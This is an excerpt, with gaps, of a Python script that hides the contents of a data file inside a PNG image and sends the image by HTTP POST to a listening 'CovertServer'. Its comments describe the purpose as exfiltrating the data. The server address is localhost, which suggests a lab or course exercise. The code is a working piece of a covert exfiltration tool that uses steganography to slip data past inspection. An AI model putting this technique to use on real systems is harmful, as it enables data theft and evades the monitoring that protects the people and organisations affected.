...
# Path to image on disk to hide file data in
default_path_to_image = "image.png"

# Path to data file on disk to hide in image
default_path_to_data = "data.txt"

# Path to write image containing hidden file data to on disk and send to server
default_path_to_write_image = "hidden.png"

# IP of CovertServer to exfiltrate image to
serverIP = "127.0.0.1"
...
def send_image():
    """!@brief Sends image containing file data to flask server listening for HTTP POST requests.
    """
    url = "http://" + serverIP + ":80"
    bits = check_data_validity(default_path_to_write_image)
    fd = 0
    try:
        fd = open(default_path_to_write_image, "rb")
        files = {"file": fd}
        requests.post(url, files=files)
    except:
        print("Failed to open the image containing file data and send it to server.")
        sys.exit()


def main():
    """!@main Orchestrates hiding file data in an image and sending that image to server
    """
    ...
    # Sends image containing file data to server
    send_image()
